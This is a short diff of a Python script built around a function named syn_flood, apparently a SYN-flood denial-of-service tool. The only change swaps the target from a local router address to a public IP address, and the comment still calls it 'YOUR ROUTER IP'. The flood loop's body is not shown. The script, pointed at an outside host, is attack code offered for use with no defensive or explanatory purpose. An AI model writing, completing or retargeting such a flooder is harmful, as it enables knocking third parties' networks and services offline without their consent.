@@ -2,7 +2,7 @@ import socket
 import threading
 import random
 
-router_ip = "192.168.1.1"  # ← YOUR ROUTER IP
+router_ip = "62.109.121.43"  # ← YOUR ROUTER IP
 
 def syn_flood():
     while True:
